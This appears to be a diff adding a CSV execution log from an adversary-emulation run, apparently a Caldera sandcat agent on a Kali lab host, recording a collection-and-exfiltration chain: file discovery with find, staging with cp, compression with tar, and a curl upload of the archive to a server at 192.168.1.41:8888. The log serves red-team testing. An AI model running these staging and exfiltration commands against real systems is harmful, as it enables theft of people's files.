@@ -1,0 +1,10 @@
+Time Ran,Ability Name,Agent,Host,pid,Link Command,Plaintext Command
+2025-09-16T07:35:55Z,Create staging directory,snnriz,cyberpi,2605,mkdir -p staged && echo $PWD/staged,mkdir -p staged && echo $PWD/staged
+2025-09-16T07:36:05Z,Find files,snnriz,cyberpi,2609,find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5,find / -name '*.png' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+2025-09-16T07:37:06Z,Find files,snnriz,cyberpi,2614,find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5,find / -name '*.yml' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+2025-09-16T07:37:51Z,Find files,snnriz,cyberpi,2618,find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5,find / -name '*.wav' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+2025-09-16T07:38:52Z,Stage sensitive files,snnriz,cyberpi,2668,cp /boot/grub/themes/kali/select_c.png /home/kali/sandcat/gocat/staged,cp /boot/grub/themes/kali/select_c.png /home/kali/sandcat/gocat/staged
+2025-09-16T07:39:12Z,Stage sensitive files,snnriz,cyberpi,2671,cp /boot/grub/themes/kali/select_w.png /home/kali/sandcat/gocat/staged,cp /boot/grub/themes/kali/select_w.png /home/kali/sandcat/gocat/staged
+2025-09-16T07:40:17Z,Stage sensitive files,snnriz,cyberpi,2674,cp /boot/grub/themes/kali/select_e.png /home/kali/sandcat/gocat/staged,cp /boot/grub/themes/kali/select_e.png /home/kali/sandcat/gocat/staged
+2025-09-16T07:40:57Z,Compress staged directory,snnriz,cyberpi,2677,tar -P -zcf /home/kali/sandcat/gocat/staged.tar.gz /home/kali/sandcat/gocat/staged && echo /home/kali/sandcat/gocat/staged.tar.gz,tar -P -zcf /home/kali/sandcat/gocat/staged.tar.gz /home/kali/sandcat/gocat/staged && echo /home/kali/sandcat/gocat/staged.tar.gz
+2025-09-16T07:41:57Z,Exfil staged directory,snnriz,cyberpi,2683,curl -F "data=@/home/kali/sandcat/gocat/staged.tar.gz" --header "X-Request-ID: `hostname`-snnriz" http://192.168.1.41:8888/file/upload,curl -F "data=@/home/kali/sandcat/gocat/staged.tar.gz" --header "X-Request-ID: `hostname`-snnriz" http://192.168.1.41:8888/file/upload
